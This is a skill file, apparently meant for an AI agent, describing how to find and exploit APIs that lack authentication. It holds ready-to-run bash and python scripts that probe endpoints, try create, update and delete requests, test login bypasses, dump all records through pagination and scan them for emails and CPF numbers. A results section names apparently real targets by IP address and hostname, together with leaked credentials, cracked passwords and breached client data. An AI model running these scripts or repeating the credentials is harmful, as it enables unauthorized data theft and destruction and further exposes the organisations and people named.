---
name: api-noauth-hunt
description: Exploit no-auth APIs for data theft and CRUD via probes.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, API, no-auth, data-breach, CRUD]
    category: recon
    related_skills:
      - firebase-supabase-attack
      - js-secrets-extraction
      - port-service-discovery
      - source-leak-hunt
---

# API NoAuth Hunt Skill

Discover and exploit APIs that lack authentication entirely. This is the most impactful vulnerability class confirmed across multiple targets: TSData (59 contracts, full CRUD), Thgroep (1,082 tax clients, 60+ endpoints, CVSS 10.0), SemaMart (34 hospitals, plaintext passwords), Core3 (126,303 clients, 448 employees, Efí Bank API), and CGE-RJ (389 AD users, 200 groups, 6 SQLi).

## When to Use

- Port scan reveals HTTP services on non-standard ports (3000, 5000, 8080-8085, 9000).
- Target has an API subdomain (api.target.com, backend.target.com).
- JavaScript bundles reference internal API endpoints.
- After `port-service-discovery` finds HTTP on unexpected ports.
- After `firebase-supabase-attack` identifies backend APIs.

## Prerequisites

- `terminal` tool with curl, python3, jq.
- Target URL or IP:port of the suspected API.
- List of common API paths for fuzzing.

## How to Run

```bash
# Quick API test — try common paths without auth
TARGET="https://api.target.com"
for path in "/" "/api" "/api/v1" "/api/users" "/api/health" "/docs" "/swagger.json"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$path")
  echo "HTTP $code: $TARGET$path"
done
```

## Quick Reference

| Signal | What It Means | Action |
|--------|---------------|--------|
| HTTP 200 on `/api/users` or `/api/clients` | No-auth data access | Full dump |
| HTTP 200 on POST without auth | Create/update possible | Test CRUD |
| OpenAPI/Swagger at `/docs`, `/swagger.json` | Full API map exposed | Enumerate all endpoints |
| Stack trace on error | Internal paths, framework version | Map infrastructure |
| DELETE via GET method | Improper HTTP method | Delete data, bypass CSRF |
| Login without password validation | Any identifier grants access | Full account takeover |

## Procedure

### Phase 1 — API Discovery

```bash
TARGET="$1"      # URL or IP:port
OUTDIR="/root/output/api_recon"
mkdir -p "$OUTDIR"

echo "[*] API discovery on $TARGET"

# Common API paths
API_PATHS=(
  "/" "/api" "/api/v1" "/api/v2" "/v1" "/v2"
  "/api/users" "/api/clients" "/api/admin" "/api/health"
  "/api/auth" "/api/login" "/api/register"
  "/api/products" "/api/orders" "/api/contracts"
  "/docs" "/swagger.json" "/swagger.yaml" "/openapi.json"
  "/api-docs" "/swagger-ui.html" "/graphql"
  "/health" "/status" "/version" "/info" "/ping"
  "/actuator" "/actuator/health" "/actuator/info" "/actuator/env"
)

for path in "${API_PATHS[@]}"; do
  code=$(curl -sk -o /tmp/api_probe_$$.tmp -w "%{http_code}" --max-time 5 "$TARGET$path" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    body=$(cat /tmp/api_probe_$$.tmp)
    content_type=$(file -b --mime-type /tmp/api_probe_$$.tmp 2>/dev/null)

    # Check if it's JSON (likely API)
    if echo "$body" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
      record_count=$(echo "$body" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 'object')" 2>/dev/null)
      echo "  [API] $path → HTTP 200 (JSON, ${record_count} records)"
    elif echo "$body" | grep -qi "swagger\|openapi"; then
      echo "  [SWAGGER] $path → HTTP 200 (API documentation)"
    elif echo "$body" | grep -qi "graphql"; then
      echo "  [GRAPHQL] $path → HTTP 200"
    else
      echo "  [HTTP] $path → HTTP 200 (${#body} bytes, $content_type)"
    fi
  elif [[ "$code" == "401" || "$code" == "403" ]]; then
    echo "  [AUTH] $path → HTTP $code (protected)"
  elif [[ "$code" == "500" ]]; then
    echo "  [ERROR] $path → HTTP 500 (potential injection point)"
    cat /tmp/api_probe_$$.tmp | head -5
  elif [[ "$code" != "404" && "$code" != "000" ]]; then
    echo "  [$code] $path"
  fi
done
rm -f /tmp/api_probe_$$.tmp
```

### Phase 2 — OpenAPI/Swagger Exploitation

```bash
TARGET="$1"

echo "[*] Extracting API schema..."

# Try multiple Swagger paths
for sw_path in "/swagger.json" "/swagger.yaml" "/openapi.json" "/api/swagger.json" \
  "/api-docs" "/v2/api-docs" "/v3/api-docs"; do
  schema=$(curl -sk --max-time 10 "$TARGET$sw_path" 2>/dev/null)

  if echo "$schema" | grep -q '"paths"'; then
    echo "[+] Found OpenAPI spec at $sw_path"

    # Extract all endpoints
    echo "$schema" | python3 -c "
import sys, json
spec = json.load(sys.stdin)
paths = spec.get('paths', {})
for path, methods in paths.items():
    for method in methods.keys():
        if method not in ('parameters',):
            print(f'  {method.upper():7s} {path}')
" 2>/dev/null

    # Save for later use
    echo "$schema" > /tmp/openapi_$$.json
    echo "[+] Schema saved to /tmp/openapi_$$.json"
    break
  fi
done
```

### Phase 3 — Full CRUD Testing

```bash
TARGET="$1"
ENDPOINT="$2"  # e.g., /api/users or /api/clients

echo "[*] CRUD testing on $TARGET$ENDPOINT"

# READ (GET) — list all
echo -n "  GET list: "
count=$(curl -sk "$TARGET$ENDPOINT" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 'object')" 2>/dev/null)
echo "$count records"

# READ (GET) — single item
echo -n "  GET by ID (id=1): "
code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT/1" 2>/dev/null)
echo "HTTP $code"

# CREATE (POST)
echo -n "  POST create: "
PROBE_DATA='{"test_probe":"noauth_test_'$(date +%s)'","created_by":"recon"}'
code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" -d "$PROBE_DATA" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "HTTP $code"

# UPDATE (PUT/PATCH)
echo -n "  PUT update: "
code=$(curl -sk -X PUT "$TARGET$ENDPOINT/1" \
  -H "Content-Type: application/json" -d "$PROBE_DATA" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "HTTP $code"

# DELETE
echo -n "  DELETE (id=1): "
code=$(curl -sk -X DELETE "$TARGET$ENDPOINT/1" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "HTTP $code"

# Login bypass test (if /api/login or /api/auth exists)
LOGIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/login" 2>/dev/null)
if [[ "$LOGIN_CODE" == "200" ]]; then
  echo ""
  echo "[*] Login endpoint found — testing bypass patterns:"

  # Test 1: Empty credentials
  echo -n "  Empty body: "
  curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
    -d '{}' -o /dev/null -w "%{http_code}" 2>/dev/null
  echo ""

  # Test 2: No password
  echo -n "  No password validation: "
  curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com"}' -o /tmp/login_test_$$.txt -w "%{http_code}" 2>/dev/null
  if grep -qi "token\|session\|success" /tmp/login_test_$$.txt 2>/dev/null; then
    echo "BYPASSED — no password required!"
  else
    echo "blocked"
  fi

  # Test 3: Type juggling
  echo -n "  Type juggling: "
  curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
    -d '{"password":true,"email":true}' -o /dev/null -w "%{http_code}" 2>/dev/null
  echo ""
  rm -f /tmp/login_test_$$.txt
fi
```

### Phase 4 — Data Extraction Pipeline

```bash
TARGET="$1"
ENDPOINT="$2"  # confirmed no-auth endpoint
OUTDIR="/root/output/api_recon/data"

echo "[*] Full data extraction from $TARGET$ENDPOINT"

# Extract ALL pages (handle pagination)
PAGE=1
PAGE_SIZE=100
TOTAL=0

while true; do
  DATA=$(curl -sk "$TARGET$ENDPOINT?page=$PAGE&limit=$PAGE_SIZE" 2>/dev/null)

  # Also try offset-based pagination
  if [[ "$PAGE" -eq 1 ]] && echo "$DATA" | grep -q "error\|not found"; then
    DATA=$(curl -sk "$TARGET$ENDPOINT?offset=0&limit=$PAGE_SIZE" 2>/dev/null)
  fi

  count=$(echo "$DATA" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null)

  if [[ "$count" -eq 0 ]]; then
    break
  fi

  echo "$DATA" >> "$OUTDIR/${ENDPOINT//\//_}_page${PAGE}.json"
  TOTAL=$((TOTAL + count))
  echo "  Page $PAGE: $count records (total: $TOTAL)"

  PAGE=$((PAGE + 1))
  sleep 0.5  # Rate limit
done

echo "[+] Extracted $TOTAL records to $OUTDIR/"

# PII scan on extracted data
echo "[*] PII scan:"
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.json 2>/dev/null | sort -u | head -10
grep -oP '\b[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}\b' "$OUTDIR"/*.json 2>/dev/null | head -5  # CPF
grep -oP '\b[0-9]{11}\b' "$OUTDIR"/*.json 2>/dev/null | head -5  # CPF (digits only)
```

## Real Production Results

### TSData (Engebras) — 177.54.22.74:3001
- ZERO authentication on Express API
- 59 contracts with client names, cities, AWS costs ($32K/month)
- Full CRUD: CREATE new contracts, UPDATE values, DELETE
- 3 hardcoded credentials in JS: `admin:Egb@2k26`, `linhares:131014`, `viewer:Viewer@2k26`

### Thgroep — thgroep-adam.scriptbees.com
- Production tax accounting API without ANY authentication
- 1,082 clients with PII, 479 active tax filings, internal work notes
- 13 user accounts (bcrypt), 5 cracked passwords
- DELETE via GET method (improper HTTP)
- CVSS 10.0 — complete system compromise

### SemaMart — test.hintel.semamart.com/api
- ZERO auth on all endpoints, CORS wide open
- 4 admins + 34 hospital users + 29 inventory managers with plaintext passwords
- Password reuse pattern: `[Name]7231@` across 15+ accounts
- Password `password` (literal) used by 5+ accounts

### Core3 — 187.87.34.114:8085
- Directory listing exposed 108 PHP files
- IXC token in backup file → bypass IP whitelist via SSRF proxy
- Login without password validation: any CPF grants full session
- Efí Bank API: mTLS certificate + JWT tokens → 18 real transactions

## Pitfalls

- **HTTP 200 ≠ API.** Some services return HTML on unexpected paths. Verify JSON content type.
- **Pagination limits.** APIs may cap at 100-1000 records per page. Check response headers for total count.
- **Rate limiting on POST/PUT/DELETE.** Test with one request first; don't spam the API.
- **DELETE is irreversible.** Verify with a test record before deleting real data.
- **Login bypass tests can trigger alerts.** Use obvious test accounts.

## Verification

- At least one endpoint MUST return structured data (JSON array or object) without authentication.
- FULL CRUD: READ, CREATE, UPDATE, DELETE must all be confirmed functional.
- PII scan: at least one type of PII must be identified in the extracted data.
- Every no-auth endpoint must be documented with: URL, HTTP method, sample response, PII found.
- Impact: the total number of exposed records must be quantified.
